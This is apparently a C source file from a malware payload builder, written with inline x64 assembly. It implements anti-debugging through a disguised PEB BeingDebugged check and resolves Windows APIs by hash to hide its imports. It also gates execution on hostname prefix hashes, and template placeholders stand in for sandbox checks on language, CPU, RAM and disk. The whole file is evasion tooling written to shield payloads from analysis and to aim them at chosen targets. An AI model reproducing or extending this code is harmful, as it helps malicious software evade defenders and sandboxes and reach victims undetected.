#include "libc.h"
#include "sandbox.h"
#include "winapi.h"

// Function to check if the program is being debugged
// Uses low-level assembly to detect debugging on Windows x64 systems.
// Note: 32-bit systems are ignored as they are not a target for payloads.
bool is_being_debugged() {
    bool beingDebugged = false;
    #ifdef _WIN64
        __asm__ (
            // Access the Process Environment Block (PEB) to detect debugging
            "mov $0xae, %%rax\n\t"
            "xor %%rdx, %%rdx\n\t"
            "xor $0xce, %%rax\n\t"
            "mov %%gs:(%%rax), %%rax\n\t" // Access PEB
            "inc %%rax\n\t"
            "inc %%rax\n\t"
            "mov (%%rax), %[result]\n\t" // Check the BeingDebugged flag
            : [result] "=r" (beingDebugged)
            : 
            : "rax", "rdx", "memory"
        );
    #endif
    return beingDebugged; // Return true if debugging is detected
}

// Function to retrieve the hostname of the computer
// Dynamically resolves the GetComputerName function and retrieves the hostname.
const char* get_hostname(HMODULE hKernel32dll) {
    static char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName) / sizeof(computerName[0]);
    // GetComputerName function is resolved dynamically
    GetComputerNameFunc _GetComputerName = (GetComputerNameFunc)CustomGetProcAddress(hKernel32dll, GET_COMPUTER_NAME_HASH);
    if (_GetComputerName(computerName, &size)) {
        return computerName; // Successfully retrieved hostname
    } else {
        return "Error"; // Failed to retrieve hostname
    }
}


// Function to compute a hash with rotation
// Implements a custom hashing algorithm with configurable rotation direction and value.
unsigned int compute_hash(const char* str, uint8_t rotation_value, bool is_rotation_right) {
    unsigned int hash = 0;
    size_t str_len = strlen(str);

    for (size_t i = 0; i <= str_len; i++) { // Include null terminator
        // Rotate the hash based on the specified direction
        if (is_rotation_right) {
            hash = ((hash >> rotation_value) | (hash << (32 - rotation_value))) & 0xFFFFFFFF; // Rotate right
        } else {
            hash = ((hash << rotation_value) | (hash >> (32 - rotation_value))) & 0xFFFFFFFF; // Rotate left
        }
        // Add the current character to the hash
        hash = (hash + (unsigned char)str[i]) & 0xFFFFFFFF;
    }
    return hash; // Return the computed hash
}

// Function to check if a string matches a prefix hash
// Uses assembly to compute the hash of the string and compare it with the given prefix hash.
bool is_string_matching_prefixHash(const char* str, ObjHash prefix_hash) {
    bool match = true;
    size_t str_len = strlen(str);
    __asm__ (
        // Compute the hash of the string and compare it with the prefix hash
        "mov %[string], %%rsi\n\t"
        "mov %[hash], %%r10d\n\t"
        "movzx %[is_ror], %%r8d\n\t"
        "xor %%r9d, %%r9d\n\t"
        "mov %[str_len], %%rcx\n\t"

    "hash_loop:\n\t"
        "xor %%rax, %%rax\n\t"
        "lodsb\n\t" // Load the next byte of the string
        "add %%eax, %%r9d\n\t" // Add the byte to the hash
        "push %%rcx\n\t"
        "test %%r8d, %%r8d\n\t"
        "movzx %[rotation_value], %%ecx\n\t"   
        "jz rotate_left_%=\n\t"
        "ror %%cl, %%r9d\n\t" // Rotate right
        "jmp rotate_end_%=\n\t"
    "rotate_left_%=:\n\t"
        "rol %%cl, %%r9d\n\t" // Rotate left
    "rotate_end_%=:\n\t"
        "pop %%rcx\n\t"
        "cmp %%r10d, %%r9d\n\t" // Compare the computed hash with the prefix hash
        "jz matching\n\t"
        "cmp %%ah, %%al\n\t"
        "jnz hash_loop\n\t"
    "not_matching:\n\t"
        "mov $0, %[result]\n\t" // Set match to false
        "jmp end\n\t"
    "matching:\n\t"
        "mov $1, %[result]\n\t" // Set match to true
    "end:\n\t"
        : [result] "=r" (match)
        : [hash] "r" (prefix_hash.value), [string] "r" (str), [str_len] "r" (str_len), [rotation_value] "r" (prefix_hash.rotation_value), [is_ror] "m" (prefix_hash.is_rotation_right) // %
        : "rax", "rcx", "rsi", "r8", "r9", "r10", "memory" 
    );
    return match; // Return whether the string matches the prefix hash
}

// Function to validate the hostname
// Checks if the hostname matches a target prefix hash or avoids specific prefixes.
bool is_valid_hostname(const char* hostname) {
    // Case 1: Check if TARGET_HOSTNAME_PREFIX_HASH is set
    if (is_objhash(TARGET_HOSTNAME_PREFIX_HASH)) {
        return is_string_matching_prefixHash(hostname, TARGET_HOSTNAME_PREFIX_HASH); // Check target prefix
    } else {
        // Case 2: Check against avoided hostname prefix hashes
        for (size_t i = 0; i < AVOIDED_HOSTNAME_PREFIX_HASHES_SIZE; i++) {
            if (is_string_matching_prefixHash(hostname, AVOIDED_HOSTNAME_PREFIX_HASHES[i])) {
                return false; // Avoided prefix found
            }
        }
    }
    return true; // Default to valid if no matches are found
}

// Function to validate the system language
// Placeholder for logic to check the system's country or language settings.
bool is_valid_language(HMODULE hKernel32, HMODULE hUser32) {
    // Placeholder for country check logic
    %SANDBOX__COUNTRY_CHECK%
    return true;
}

// Function to validate the computer's hardware
// Placeholder for logic to check CPU, RAM, and disk specifications.
bool is_valid_computer(HMODULE hKernel32) {
    // Placeholder for CPU, RAM, and disk checks
    %SANDBOX__CPU_CHECK%
    %SANDBOX__RAM_CHECK%
    %SANDBOX__DISK_CHECK%
    return true;
}

bool is_sandboxed() {
    HMODULE hKernel32 = CustomGetModuleHandle(KERNEL32_HASH);
    HMODULE hUser32   = CustomGetModuleHandle(USER32_HASH);

    return !is_valid_computer(hKernel32) || !is_valid_language(hKernel32, hUser32);
}
